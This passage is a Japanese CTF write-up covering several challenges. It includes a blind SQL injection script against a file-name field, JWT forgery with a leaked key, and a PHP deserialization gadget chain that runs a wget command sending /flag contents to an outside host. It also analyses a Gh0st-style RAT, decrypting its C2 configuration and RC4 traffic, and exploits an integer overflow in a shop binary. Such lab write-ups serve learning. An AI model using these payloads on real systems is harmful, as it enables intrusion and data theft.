const TOKEN  = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImEiLCJ1dWlkIjoiZjU1Njc1MTMtZTI1My00NDI0LWFkZDktMWY5NDA3YjQ5MzhmIiwiaWF0IjoxNzU3NzY5MTcyLCJleHAiOjE3NTc3NzI3NzJ9.dV8bXehZB4tOHlFFM9NiNPTycg47SYT9loSDvvs4LBOWJqQpThaypvFhIRZJjHpeWcM5i1SSrmRriu_auxFOcL_ekHzLu8ka5vsiz3kWCiqCwmFAkt5rma4wvuuKzGI7GVuq6ewk5DgHUertNBnJeaCiXsEddFJ1xMgu3OxQCgMb4zJaq_j6bHF5wDiiwO6QCIhkq6tJTS-63oUex4oJul9t_P5gsWZAd39D31spSV5zZgevKk-PUEGVrEfjeOjJOCstwGAdgR0SPWefXSnUmFH3pR9GU22aDMrs0NAyYiUwoqoqVBj3X9c201MAGIeYBFJDKFEVR0oJlA7H1_ItFETrqi-tgExJ5C8D3gq-XvqiHCFjhOqkzNm0RYYYrsdVnqPPFDidyGBE-O_6oiPIY14VjITsDuOEvJJgXuDaX0_XKKfUC2FTG9Xht32Qnxdv83UbtQL0nFvW03yzuWmYO0yjYwPt3N_JXJ7xGPanujwx-HmVL9tgtiThufWu6vYCA1qUvgx8bH67vC4pJpVTW2SsF7Qi1dgc71bMpAh_UU3BKGLNwT4mD_c0ioqoZqEfHK1n_HCpbVevwdJ-ruSqtzJ7c35jsuEg3AkYa7c3tSvhoMpJcpA6BdiljTglRvNcXw-OeFioh2T79bFTjB5CHXLfz2v_sIuHTAAdNT3V1rU";

// 1x1 PNG（MIME チェック通過用）
const base64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=";
const bin = atob(base64);
const bytes = new Uint8Array(bin.length);
for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);

const CHARSET = "0123456789abcdef-";

async function sendOnce(filenamePayload) {
  const fd = new FormData();
  fd.append("title", "t");
  fd.append("content", "c");
  fd.append("filename", new Blob([bytes], { type: "image/png" }), filenamePayload);
  const res = await fetch(TARGET, {
    method: "POST",
    body: fd,
    redirect: "manual",
    headers: { Cookie: `token=${TOKEN}` },
  });
  let body = "";
  try { body = await res.text(); } catch {}
  return { status: res.status, location: res.headers.get("location"), body };
}

async function isCharAt(pos, ch) {
  // updatexml の第2引数は常に不正な XPath になるよう ~A~ を埋め込む（値を画面に出さなくてOK）
  const payload = `x' OR IF(SUBSTRING((SELECT uuid FROM users WHERE role = 'admin' LIMIT 1) FROM ${pos} FOR 1) = '${ch}', updatexml(1,concat(0x7e,(SELECT user()),0x7e),1), 1) #`
  const r = await sendOnce(payload);
  return r.status === 500;
}

async function getCharAt(pos) {
  for (const ch of CHARSET) {
    if (await isCharAt(pos, ch)) return ch;
  }
  return "?"; // 非想定文字
}

(async () => {
  const UUID_LEN = 36;
  let uuid = "";
  for (let pos = 1; pos <= UUID_LEN; pos++) {
    const ch = await getCharAt(pos);
    uuid += ch;
    console.log(`[pos ${pos}] -> ${ch}   (${uuid})`);
  }
  console.log(`\n[+] admin uuid: ${uuid}`);
})().catch(e => {
  console.error(e);
  process.exit(1);
});
```

ここまでで秘密鍵とuuidが得られた。あとはadminのusernameが分かればadminのjwtを作成することができる。このusernameは`/users/1`にアクセスすれば分かる。

以上の情報を元にこのコードでjwtを作成して付与すると、`/admin`へのアクセスができるようになった。

```py
#!/usr/bin/env python3
import jwt, time

# get_key.shで取得
with open("private.key") as f:
    PRIV = f.read()

ADMIN_USER  = "ivan" # /users/1で確認
ADMIN_UUID  = "a8b3cea2-4ff0-45a8-9e7f-a793c48b9475" # get_uuid.jsで取得

now = int(time.time())
payload = {
    "username": ADMIN_USER,
    "uuid": ADMIN_UUID,
    "iat": now,
    "exp": now + 3600
}

token = jwt.encode(payload, PRIV, algorithm="RS256")
print(token)
```

目標はあくまでRCEなので他の脆弱性を探していると、`Admin@index`から呼ばれる`AppSetting::getSettings()`の中に`unserialize()`を見つけた。settingsの値は任意のものを渡せるので、ガジェットさえあれば[PHP Object Injection](https://www.vaadata.com/blog/what-is-object-injection-exploitations-and-security-best-practices/)からのRCEができそう。

ガジェットを探していくと、`Core\Router`に`__destruct()`が、`Core\Event::execute()`に`call_user_func_array($this->callback, $this->args)`が見つかった。
この`__destruct()`では`dispatch()`を呼んでいるので、`execute()`が`call_user_func_array(system, {cmd})`になるように`Core\Event`を組み立て、`dispatch()`を差し替えて`execute()`にすれば`__destruct()`が呼ばれる（すなわちプログラムが実行される）時に任意のコマンドを実行できるので、RCE達成となる。

このpayloadを頑張って組み立て、リクエストを送るスクリプトを書く。

```py
#!/usr/bin/env python3
import requests, time, jwt

BASE = "http://10.0.128.226:8093"

PRIVATE_KEY_PATH = "./private.key" # get_key.shで取得
ADMIN_USER  = "ivan" # /users/1で確認
ADMIN_UUID  = "a8b3cea2-4ff0-45a8-9e7f-a793c48b9475" # get_uuid.jsで取得

def forge_token():
    with open("private.key") as f:
        PRIV = f.read()
    now = int(time.time())
    payload = {
        "username": ADMIN_USER,
        "uuid": ADMIN_UUID,
        "iat": now,
        "exp": now + 3600
    }
    token = jwt.encode(payload, PRIV, algorithm="RS256")
    print(token)
    return token

sess = requests.Session()
sess.cookies.set("token", forge_token())

cmd = "wget http://10.0.0.75:9000?f=$(cat /flag*)"

# ===== PHP オブジェクトインジェクション payload =====
# Core\Router::__destruct() -> dispatch() -> (Core\Event)->execute() -> system(cmd)
k1 = "\x00Core\\Router\x00event"
k2 = "\x00Core\\Event\x00callback"
k3 = "\x00Core\\Event\x00args"

payload = (
    'O:11:"Core\\Router":1:{'
    f's:18:"{k1}";'
      'O:10:"Core\\Event":2:{'
        f's:20:"{k2}";s:6:"system";'
        f's:16:"{k3}";a:1:{{i:0;s:{len(cmd)}:"{cmd}";}}'
      '}'
    '}'
)

# 1) app_settings.settings を置換
r = sess.post(f"{BASE}/admin/update-record", data={
    "table": "app_settings",
    "record_id": "1",
    "column": "settings",
    "value": payload
})
assert r.status_code in (200, 302), f"update failed: {r.status_code}"

# 2) /admin にアクセス → __destruct チェーンで system(cmd) 実行
r = sess.get(f"{BASE}/admin")
```

flagが得られた。
`flag{wh47'5_y0ur_fav0r173_s3r14l?}`

#### 別解

`$existing_image`がtruthyではない時にファイル名が変更されるようになっているので、これをオラクルとしてuuidを抜き出すこともできるらしい。

```php
$existing_image = \App\Models\Post::findImage($user['id'], $post_id, $filename);

if ($existing_image) {
    $upload_filename = $filename;
} else {
    $basename = pathinfo($filename, PATHINFO_FILENAME);
    $extension = pathinfo($filename, PATHINFO_EXTENSION);
    $upload_filename = $basename . '_' . bin2hex(random_bytes(16)) . '.' . $extension;
    $upload_file = UPLOAD_DIR . $upload_filename;
    move_uploaded_file($_FILES['filename']['tmp_name'], $upload_file);
}
```

# Malware Analysis

## Downloader [280pt / 45 solves]

stringsで文字列抽出するだけ。

```
$ strings Downloader.exe | grep http
http://172.30.153.199/x2hZq0XMZro0
```

`http://172.30.153.199/x2hZq0XMZro0`

## Acrobatics [320pt / 37 solves]

Acrobatで開いて適当な場所をクリックするとダイアログが表示された。
![](https://storage.googleapis.com/zenn-user-upload/89295950c83b-20250915.png)

これをbase64で復号するとflagが得られた。
`flag{pdf_javascript_magic}`

## CustomEncryptor [405pt / 20 solves]

（おそらく）C#のreversing問。
ぶっちゃけ何も分からず、LLMに投げて言われた通りにdnSpyでデコンパイルしたコードを渡していたらflagまで取ってくれた。作問者の方ごめんなさい。
<https://chatgpt.com/share/68c7973a-6f60-8008-a4ef-cc4867a9a316>
`flag{W!7h_PR1V@TE_K3Y_C0M3$_GR3@T_R3$P0N51BI!I7Y}`

## Hidden [485pt / 4 solves]

謎のexeファイルとpcapファイルがある。結構なサイズで読むのがしんどそうなので一旦LLMに投げる。
言われた通りにデコンパイルしたコードを渡していると、何かをSalsa20というストリーム暗号で暗号化していることが分かった。
<https://chatgpt.com/share/68c799b8-acc8-8008-bd21-d80710e8b15a>

LLMが提示してくれた復号スクリプトそのままでは動かなかったのでいい感じに改良し、実行するとDLLファイルが得られた。

```py
# -*- coding: utf-8 -*-
# Decrypt BIN(101) resource from something.exe using Salsa20/20 and dump hidden() RVA.
import struct
from pathlib import Path

# -------------------- helpers --------------------
def u16(b, o): return struct.unpack('<H', b[o:o+2])[0]
def u32(b, o): return struct.unpack('<I', b[o:o+4])[0]
def rotl32(v, n): return ((v << n) & 0xffffffff) | (v >> (32 - n))

def salsa20_block(state):  # 64-byte keystream block
    x = state.copy()
    for _ in range(10):    # 20 rounds
        # column
        x[ 4]^=rotl32((x[ 0]+x[12])&0xffffffff, 7);  x[ 8]^=rotl32((x[ 4]+x[ 0])&0xffffffff, 9)
        x[12]^=rotl32((x[ 8]+x[ 4])&0xffffffff,13);  x[ 0]^=rotl32((x[12]+x[ 8])&0xffffffff,18)
        x[ 9]^=rotl32((x[ 5]+x[ 1])&0xffffffff, 7);  x[13]^=rotl32((x[ 9]+x[ 5])&0xffffffff, 9)
        x[ 1]^=rotl32((x[13]+x[ 9])&0xffffffff,13);  x[ 5]^=rotl32((x[ 1]+x[13])&0xffffffff,18)
        x[14]^=rotl32((x[10]+x[ 6])&0xffffffff, 7);  x[ 2]^=rotl32((x[14]+x[10])&0xffffffff, 9)
        x[ 6]^=rotl32((x[ 2]+x[14])&0xffffffff,13);  x[10]^=rotl32((x[ 6]+x[ 2])&0xffffffff,18)
        x[ 3]^=rotl32((x[15]+x[11])&0xffffffff, 7);  x[ 7]^=rotl32((x[ 3]+x[15])&0xffffffff, 9)
        x[11]^=rotl32((x[ 7]+x[ 3])&0xffffffff,13);  x[15]^=rotl32((x[11]+x[ 7])&0xffffffff,18)
        # row
        x[ 1]^=rotl32((x[ 0]+x[ 3])&0xffffffff, 7);  x[ 2]^=rotl32((x[ 1]+x[ 0])&0xffffffff, 9)
        x[ 3]^=rotl32((x[ 2]+x[ 1])&0xffffffff,13);  x[ 0]^=rotl32((x[ 3]+x[ 2])&0xffffffff,18)
        x[ 6]^=rotl32((x[ 5]+x[ 4])&0xffffffff, 7);  x[ 7]^=rotl32((x[ 6]+x[ 5])&0xffffffff, 9)
        x[ 4]^=rotl32((x[ 7]+x[ 6])&0xffffffff,13);  x[ 5]^=rotl32((x[ 4]+x[ 7])&0xffffffff,18)
        x[11]^=rotl32((x[10]+x[ 9])&0xffffffff, 7);  x[ 8]^=rotl32((x[11]+x[10])&0xffffffff, 9)
        x[ 9]^=rotl32((x[ 8]+x[11])&0xffffffff,13);  x[10]^=rotl32((x[ 9]+x[ 8])&0xffffffff,18)
        x[12]^=rotl32((x[15]+x[14])&0xffffffff, 7);  x[13]^=rotl32((x[12]+x[15])&0xffffffff, 9)
        x[14]^=rotl32((x[13]+x[12])&0xffffffff,13);  x[15]^=rotl32((x[14]+x[13])&0xffffffff,18)
    for i in range(16): x[i] = (x[i] + state[i]) & 0xffffffff
    return b''.join(struct.pack('<I', w) for w in x)

def salsa20_stream(key, nonce, length):
    c = b"expand 32-byte k"
    k = [u32(key, i*4) for i in range(8)]
    n0, n1 = u32(nonce,0), u32(nonce,4)
    out = bytearray(); c0=c1=0
    while len(out) < length:
        s = [u32(c,0),k[0],k[1],k[2],k[3],u32(c,4),n0,n1,c0,c1,u32(c,8),k[4],k[5],k[6],k[7],u32(c,12)]
        out += salsa20_block(s)
        c0 = (c0 + 1) & 0xffffffff
        if c0 == 0: c1 = (c1 + 1) & 0xffffffff
    return bytes(out[:length])

# -------------------- load PE and locate resource --------------------
exe = Path("something.exe").read_bytes()
e_lfanew = u32(exe, 0x3C)
assert exe[e_lfanew:e_lfanew+4] == b"PE\x00\x00", "PE signature not found"
opt = e_lfanew + 24
assert u16(exe, opt) == 0x10B, "PE32 expected"

num_sections = u16(exe, e_lfanew+6)
sec_off = opt + u16(exe, e_lfanew+20)

secs=[]
for i in range(num_sections):
    o = sec_off + i*40
    name   = exe[o:o+8].rstrip(b"\0").decode("ascii","ignore")
    vaddr  = u32(exe, o+12)
    vsize  = u32(exe, o+8)
    rawptr = u32(exe, o+20)
    rawsz  = u32(exe, o+16)
    secs.append((name, vaddr, vsize, rawptr, rawsz))

def rva2off(rva):
    for _, vaddr, vsize, rawptr, rawsz in secs:
        if vaddr <= rva < vaddr + max(vsize, rawsz):
            return rawptr + (rva - vaddr)
    return None

DD_BASE = opt + 96
RES_RVA  = u32(exe, DD_BASE + 2*8)
RES_SIZE = u32(exe, DD_BASE + 2*8 + 4)
RES_OFF  = rva2off(RES_RVA)
assert RES_OFF is not None, "Resource directory RVA did not map to a file offset"

def read_res_u16str(off):
    n = u16(exe, off); off += 2
    s = exe[off:off+n*2].decode("utf-16le", "ignore")
    return s

def dir_walk(off, path=()):
    leaves=[]
    cnt = u16(exe, off+12) + u16(exe, off+14)
    base = off + 16
    for i in range(cnt):
        ent = base + i*8
        Name, To = u32(exe, ent), u32(exe, ent+4)
        is_dir = (To & 0x80000000) != 0
        name = (read_res_u16str(RES_OFF + (Name & 0x7fffffff))
                if (Name & 0x80000000) else Name)
        tgt = RES_OFF + (To & 0x7fffffff)
        if is_dir:
            leaves += dir_walk(tgt, path + (name,))
        else:
            dataRVA = u32(exe, tgt+0)
            size    = u32(exe, tgt+4)
            data_off = rva2off(dataRVA)
            leaves.append((path + (name,), data_off, size))
    return leaves

leaves = dir_walk(RES_OFF)
# BIN / 101 / 任意言語
target = next(x for x in leaves if len(x[0])>=2 and x[0][0]=="BIN" and x[0][1] in (101, 0x65, "101"))
_, data_off, data_size = target
assert data_off is not None, "BIN(101) data RVA did not map"

enc = exe[data_off:data_off+data_size]
print("[*] BIN(101) size:", len(enc))

# -------------------- Salsa20 decrypt --------------------
key   = (b"somethingprogram"*2)      # 32 bytes
nonce = bytes(range(8))              # 00..07
ks    = salsa20_stream(key, nonce, len(enc))
dec   = bytes(a ^ b for a,b in zip(enc, ks))

Path("bin_payload.dec").write_bytes(dec)
print("[+] Wrote bin_payload.dec ; MZ =", dec[:2]==b"MZ")

# -------------------- find export 'hidden' --------------------
def pe_sections(b):
    e = u32(b, 0x3C); opt = e+24; sec_off = opt + u16(b, e+20)
    n = u16(b, e+6); out=[]
    for i in range(n):
        o = sec_off + i*40
        name=b[o:o+8].rstrip(b"\0").decode("ascii","ignore")
        vaddr=u32(b,o+12); rawptr=u32(b,o+20); rawsz=u32(b,o+16); vsize=u32(b,o+8)
        out.append((name, vaddr, rawptr, max(vsize, rawsz)))
    return out, opt

def r2o(b, secs, r):
    for _,va,raw,span in secs:
        if va <= r < va+span:
            return raw + (r - va)
    return None

secs2, opt2 = pe_sections(dec)
exp_rva = u32(dec, opt2+96)  # export dir RVA
exp_off = r2o(dec, secs2, exp_rva)
nnames  = u32(dec, exp_off+24)
names_r = u32(dec, exp_off+32)
ord_r   = u32(dec, exp_off+36)
addr_r  = u32(dec, exp_off+28)
names_o = r2o(dec, secs2, names_r)
ord_o   = r2o(dec, secs2, ord_r)
addr_o  = r2o(dec, secs2, addr_r)

hidden_rva = None
for i in range(nnames):
    nrva = u32(dec, names_o + i*4)
    noff = r2o(dec, secs2, nrva)
    s = dec[noff:dec.find(b'\0', noff)].decode('ascii','ignore')
    if s == "hidden":
        ordinal = u16(dec, ord_o + i*2)
        hidden_rva = u32(dec, addr_o + ordinal*4)
        break

if hidden_rva:
    print(f"[+] hidden() RVA = 0x{hidden_rva:X}  (file off 0x{r2o(dec, secs2, hidden_rva):X})")
else:
    print("[!] export 'hidden' not found")
```

```
$ python3 decrypt.py
[*] BIN(101) size: 157696
[+] Wrote bin_payload.dec ; MZ = True
[+] hidden() RVA = 0xC370  (file off 0xB770)
$ file bin_payload.dec
bin_payload.dec: PE32 executable (DLL) (console) Intel 80386, for MS Windows, 5 sections
```

ここからはこの`bin_payload.dec`を解析していく。まずは明らかに怪しい`hidden()`を見て、LLMと壁打ちしながら解析を進めていく。

```c
/* WARNING: Function: __alloca_probe replaced with injection: alloca_probe */
/* WARNING: Removing unreachable block (ram,0x1000c3e1) */

undefined4 hidden(void)

{
  char cVar1;
  DWORD DVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  undefined1 local_a1e0 [40540];
  CHAR local_384 [256];
  char local_284 [256];
  undefined1 local_184 [172];
  HANDLE local_d8;
  CHAR local_c8 [52];
  undefined1 local_94 [12];
  undefined4 local_88;
  undefined1 *local_84;
  undefined4 local_80;
  undefined4 local_7c;
  char *local_78;
  undefined4 local_74;
  int local_70;
  int local_6c;
  uint local_68;
  undefined4 local_64;
  DWORD local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  int local_50;
  uint local_4c;
  char *local_48;
  undefined4 local_44;
  int local_40;
  DWORD local_3c;
  int local_38;
  HANDLE local_34;
  int local_30;
  char *local_2c;
  int local_28;
  char *local_24;
  int local_20;
  char *local_1c;
  HANDLE local_18;
  undefined4 uStack_14;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
                    /* 0xc370  1  hidden */
  local_8 = 0xffffffff;
  puStack_c = &LAB_1001a81b;
  local_10 = ExceptionList;
  uStack_14 = 0x1000c392;
  local_34 = (HANDLE)0x0;
  builtin_strncpy(local_284,"ratsample",10);
  ExceptionList = &local_10;
  _memset(local_284 + 10,0,0xf6);
  local_24 = 
  "9/Pz76m8vACxvQX++AK68u8D/vMCvfMC8PO8APz9BfYEn5+fn5+fn5+fn5+fn5+fz58onrwF+/4En5+fn5+fn5+fn5+fn5+fn 5+fn5+fn5+fn5+fvAD8+vr+/QOfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+ fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn 5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+uprG9r72xva+fn5+fn5+fn5+fn5+ fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5/LjiievAX7/gSfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+8APz6+v79A5+fn 5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+ fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn 5+f"
  ;
  if (DAT_10027998 != 0) {
    ResetSSDT();
    lstrcpyA(local_384,local_284);
    DVar2 = GetTickCount();
    wsprintfA(local_c8,"Global\\Gh0st %d",DVar2);
    local_34 = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,1,local_24);
    FUN_1000ca30(local_384);
    FUN_1000c960(local_284);
  }
  SetErrorMode(1);
  local_7c = 0;
  local_4c = 0x50;
  local_38 = 0;
  local_5c = 0;
  local_58 = 0;
  local_54 = 0;
  local_80 = 0;
  local_18 = (HANDLE)0x0;
  FUN_10009e30();
  local_8 = 0;
  uStack_14 = uStack_14 & 0xffffff;
LAB_1000c4ac:
  do {
    do {
      do {
        if ((uStack_14._3_1_ != '\0') && (uStack_14._3_1_ != '\x03')) {
          for (local_20 = 0; local_20 < 2000; local_20 = local_20 + 1) {
            local_18 = OpenEventA(0x1f0003,0,local_c8);
            if (local_18 != (HANDLE)0x0) {
              FUN_1000a810();
              CloseHandle(local_18);
              break;
            }
            Sleep(0x3c);
          }
        }
        local_6c = FUN_1000b400(local_24);
        local_68 = (uint)(ushort)(short)*(char *)(local_6c + 0x30);
        local_4c = (uint)(ushort)(short)*(char *)(local_6c + 0x30);
        local_28 = local_6c;
        local_50 = FUN_100078d0(local_6c);
      } while (local_50 != 1);
      puVar3 = (undefined4 *)FUN_1000b5f0(local_94,local_6c,local_68,local_64);
      local_78 = (char *)*puVar3;
      local_74 = puVar3[1];
      local_70 = puVar3[2];
      local_48 = local_78;
      local_44 = local_74;
      local_40 = local_70;
    } while (local_70 == 0);
    if (local_38 == 0) {
      FUN_1000abd0(0,0,0x438,0,0);
    }
    else {
      FUN_1000abd0(5,local_38,local_5c,local_58,local_54);
    }
    local_3c = GetTickCount();
    local_2c = local_48;
    local_1c = &DAT_10027570;
    local_84 = &DAT_10027570;
    do {
      cVar1 = *local_2c;
      uStack_14._0_3_ = CONCAT12(cVar1,(undefined2)uStack_14);
      *local_1c = cVar1;
      local_2c = local_2c + 1;
      local_1c = local_1c + 1;
    } while (cVar1 != '\0');
    DAT_10027670 = local_44;
    DAT_1002756c = local_40;
    cVar1 = FUN_1000a020(local_48,local_44);
    if (cVar1 != '\0') {
      local_88 = 0xffffffff;
      DVar2 = GetTickCount();
      FUN_1000b980(local_384,local_184,DVar2 - local_3c);
      FUN_1000d710(local_184,local_384,DAT_1002777c,local_c8,&DAT_10027570,DAT_10027670);
      local_8 = CONCAT31(local_8._1_3_,1);
      FUN_1000abb0(local_a1e0);
      local_30 = 0;
      while ((local_30 < 10 && (cVar1 = FUN_1000dc80(), cVar1 == '\0'))) {
        Sleep(1000);
        local_30 = local_30 + 1;
      }
      cVar1 = FUN_1000dc80();
      if (cVar1 == '\0') {
        local_8 = local_8 & 0xffffff00;
        FUN_1000d7f0();
      }
      else {
        local_3c = GetTickCount();
        do {
          local_18 = OpenEventA(0x1f0003,0,local_c8);
          local_60 = WaitForSingleObject(local_d8,100);
          Sleep(500);
          if (local_18 != (HANDLE)0x0) break;
        } while (local_60 != 0);
        if (local_18 != (HANDLE)0x0) {
          FUN_1000a810();
          CloseHandle(local_18);
          local_8 = local_8 & 0xffffff00;
          FUN_1000d7f0();
          SetErrorMode(0);
          ReleaseMutex(local_34);
          CloseHandle(local_34);
          local_8 = 0xffffffff;
          uVar4 = FUN_10009f60();
          ExceptionList = local_10;
          return uVar4;
        }
        local_8 = local_8 & 0xffffff00;
        FUN_1000d7f0();
      }
      goto LAB_1000c4ac;
    }
    uStack_14 = CONCAT13(2,(undefined3)uStack_14);
  } while( true );
}
```

`FUN_1000b1c0`, `FUN_1000b400`で復号ロジックが分かったので、`local_24`を復号すると、`http://192.168.11.132|5678|Tx38RpBcZqMd`という、URL、port、tokenのような文字列が得られた。

ここからが困ったところで、`flag{Tx38RpBcZqMd}`などを提出しても不正解だし、提供された攻撃マシンから`http://192.168.11.132:5678`にアクセスしても何も無い。
pcapから抜き出したそれっぽいデータを画像として表示させるなども試してみたが、flagは得られず。
手詰まりになって一旦寝てしまったが、翌日またLLMと壁打ちしていると`FUN_1000a4e0`で

```c
(**(code **)(**(int **)((int)this + 0xb8) + 4))(ptr, len);
```

と関数を呼んでいるのを見つけた。これは`FUN_1000d710`で立てられたvftableのindex=1を指している。

```
                             *************************************************************
                             * const CKernelManager::vftable                              
                             *************************************************************
                             CKernelManager::vftable                         XREF[2]:     FUN_1000d710:1000d726 (*) , 
                                                                                          FUN_1000d7f0:1000d7fc (*)   
        10020b04 b0  d7  00       addr[2]
                 10  60  d8 
                 00  10
           10020b04 b0  d7  00  10    addr      FUN_1000d7b0            [0]                               XREF[2]:     FUN_1000d710:1000d726 (*) , 
                                                                                                                     FUN_1000d7f0:1000d7fc (*)   
           10020b08 60  d8  00  10    addr      FUN_1000d860            [1]
```

とあるので、`FUN_1000d860`を確認する。最終的に`FUN_1000d5f0`でRC4の復号処理を行っていることが分かった。

```c
undefined4 FUN_1000d5f0(int param_1,size_t param_2,int param_3,int param_4)

{
  undefined4 uVar1;
  undefined1 local_128 [260];
  undefined1 local_24 [12];
  undefined1 local_18 [16];
  void *local_8;
  
  if ((((param_1 == 0) || (param_3 == 0)) || (param_2 == 0)) || (param_4 == 0)) {
    FID_conflict:evaluation_error("Invalid input");
    FUN_10016b17(local_18,&DAT_10022ac0);
  }
  local_8 = malloc(param_2);
  if (local_8 == (void *)0x0) {
    FUN_1000d3f0("Memory allocation failed");
    FUN_10016b17(local_24,&DAT_10022ab0);
  }
  FUN_10016b90(local_8,param_1,param_2);
  FUN_1000d420(local_128,param_3,param_4);
  uVar1 = FUN_1000d4d0(local_128,local_8,param_2);
  return uVar1;
}
```

これでpcapがどのような処理による通信をキャプチャしたものか完全に分かったので、LLMにsolverを書いてもらう。

```py
# rc4_flag_extract.py
# 入力: suspicious.pcapng（配布zipの中身）
# 出力: flag{...}

from pathlib import Path

def rc4_ksa(key: bytes):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    return S

def rc4_prga(S, data: bytes):
    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) & 0xFF]
        out.append(b ^ K)
    return bytes(out)

def rc4_keystream(key: bytes, n: int) -> bytes:
    S = rc4_ksa(key)
    return rc4_prga(S, b"\x00"*n)

key = b"Tx38RpBcZqMd"          # DAT_1002756c = token
ks5 = rc4_keystream(key, 5)    # 既知平文 'flag{' のための鍵流
needle = bytes([a ^ b for a, b in zip(b'flag{', ks5)])   # 暗号文の先頭5バイトに現れるはずの値

pcap = Path("suspicious.pcapng").read_bytes()

pos = pcap.find(needle)
flag = None
while pos != -1:
    dec = rc4_prga(rc4_ksa(key), pcap[pos: pos+512])  # 充分長く復号
    s = dec.find(b'flag{')
    if s != -1:
        e = dec.find(b'}', s+5)
        if e != -1:
            flag = dec[s:e+1].decode('ascii', 'ignore')
            break
    pos = pcap.find(needle, pos+1)

print(flag if flag else "not found")
```

ようやくflagが得られた。
`flag{r@t_l1ke_gh0st_with_custom_pr0t0c0l_and_rc4_encrypt10n}`

# Binary Exploitation

## Abnormal [295pt / 42 solves]

ソースコードの配布は無し。Ghidraでデコンパイルしてみる。
9999999yenのflagを購入することができればflagを得られそうだ。

```c

/* WARNING: Unknown calling convention */

int main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  int32_t yakusou_stock;
  int32_t sword_stock;
  int32_t choice;
  int32_t item;
  int32_t quantity;
  int32_t money;
  int32_t price;
  int32_t unit_price;
  int32_t *stock;
  char *stock_name;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  money = 1000;
  yakusou_stock = 100;
  sword_stock = 1;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  print_banner();
LAB_00401477:
  do {
    do {
      print_status_and_choice(money,yakusou_stock,sword_stock);
      iVar1 = safe_scanf_int("> ",&choice);
    } while (iVar1 == 0);
    if (choice == 1) {
      puts(&DAT_004023a0);
      puts(" 1. Torch - 10 yen");
      puts(" 2. Holy Water - 20 yen");
      puts(" 3. Great Stone - 800 yen");
      puts(" 4. FLAG - 9999999 yen \n");
      printf("Select an item to buy: ");
      FUN_00401100(&DAT_0040200b,&item);
      price = 0;
      if (item == 4) {
        price = 9999999;
      }
      else {
        if (4 < item) {
LAB_0040157b:
          puts("Invalid selection. Please enter an integer!");
          goto LAB_00401477;
        }
        if (item == 3) {
          price = 800;
        }
        else {
          if (3 < item) goto LAB_0040157b;
          if (item == 1) {
            price = 10;
          }
          else {
            if (item != 2) goto LAB_0040157b;
            price = 0x14;
          }
        }
      }
      if (money < price) {
        puts("Not enough gold!!");
      }
      else {
        money = money - price;
        if (item == 4) {
          puts(&DAT_00402478);
          system("cat flag.txt");
          goto LAB_004017af;
        }
        puts("Item purchased.");
      }
      goto LAB_00401477;
    }
    if (choice != 2) {
      if (choice == 3) {
        puts("\nSee you again :)");
LAB_004017af:
        if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
          return 0;
        }
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      puts("Invalid command!!");
      goto LAB_00401477;
    }
    puts(&DAT_004024d0);
    puts(" 1. Herb - 10 yen ");
    puts(" 2. Legendary Sword - 220000 yen \n");
    printf("Select an item to sell: ");
    iVar1 = safe_scanf_int("> ",&item);
  } while (iVar1 == 0);
  unit_price = 0;
  stock = (int32_t *)0x0;
  stock_name = (char *)0x0;
  if (item == 1) {
    unit_price = 10;
    stock = &yakusou_stock;
    stock_name = "Herb";
  }
  else {
    if (item != 2) {
      puts("Invalid selection. Please enter an integer!");
      goto LAB_00401477;
    }
    unit_price = 220000;
    stock = &sword_stock;
    stock_name = "Legendary Sword";
  }
  printf("How many %s do you want to sell? (you have: %d): ",stock_name,(ulong)(uint)*stock);
  iVar1 = safe_scanf_int("> ",&quantity);
  if (iVar1 != 0) {
    if ((quantity < 1) || (quantity <= *stock)) {
      money = money + quantity * unit_price;
      if ((stock != (int32_t *)0x0) && (0 < quantity)) {
        *stock = *stock - quantity;
      }
      puts("Thank you :)");
    }
    else {
      puts("You don\'t have enough items... ;(");
    }
  }
  goto LAB_00401477;
}
```

売却時の処理をよく見ると、個数が1未満の時でも売却処理を行っている。
つまり、十分大きな負数の売却でアンダーフローが発生し、大量の残高が得られる。

```c
    if ((quantity < 1) || (quantity <= *stock)) {
      money = money + quantity * unit_price;
      if ((stock != (int32_t *)0x0) && (0 < quantity)) {
        *stock = *stock - quantity;
      }
      puts("Thank you :)");
    }
```

![](https://storage.googleapis.com/zenn-user-upload/eb8c21c88716-20250915.png)

あとはflagを購入するだけ。
![](https://storage.googleapis.com/zenn-user-upload/40bd5755ebf0-20250915.png)
`flag{Th3_m1nu5_cr33p5_b3y0nd_ch405}`

## Jump [320pt / 37 solves]

